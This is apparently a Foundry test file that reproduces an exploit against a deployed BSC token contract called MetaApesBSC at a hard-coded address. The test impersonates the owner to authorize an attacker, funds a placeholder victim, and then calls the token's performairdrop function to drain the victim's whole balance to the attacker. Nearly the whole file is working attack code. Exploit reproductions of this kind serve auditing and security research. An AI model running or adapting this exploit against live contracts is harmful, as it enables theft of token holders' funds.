// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface MetaApesBSC {
    function getOwner() external view returns (address);
    function authorize(address adr) external;
    function balanceOf(address account) external view returns (uint256);
    function performairdrop(address from, address[] calldata addresses, uint256[] calldata tokens) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function setRewardsEnable(bool _enabled) external;
    function setLFG() external;
    function setiDE(address holder, bool exempt) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    MetaApesBSC internal token;
    address internal victim;
    address internal owner;
    address constant TARGET = 0xd764457Fadd15B52089BeE2b3c38964C7dFf0B70;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = MetaApesBSC(TARGET);
        victim = address(0xDEADBEEF);
        owner = token.getOwner();

        // Attacker needs to be authorized to call performairdrop and other setup functions
        vm.startPrank(owner);
        token.authorize(attacker);
        vm.stopPrank();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // As attacker, disable dividend share updates for the parties involved in the setup transfer
        // to prevent side-effects that might cause a timeout.
        token.setiDE(owner, true);
        token.setiDE(victim, true);

        uint256 victimInitialBalance = 1_000_000 * 1e9;

        vm.startPrank(owner);
        // Enable LFG mode to ensure the setup transfer goes through without reverting.
        token.setLFG();
        // Transfer tokens to the victim to establish a balance to be stolen.
        token.transfer(victim, victimInitialBalance);
        vm.stopPrank();

        // Now, proceed with the main exploit.
        uint256 victimBalance = token.balanceOf(victim);
        assertTrue(victimBalance > 0, "Victim should have tokens to steal");

        address[] memory recipients = new address[](1);
        recipients[0] = attacker;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = victimBalance;

        // As the authorized attacker, call performairdrop to steal from the victim.
        token.performairdrop(victim, recipients, amounts);
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

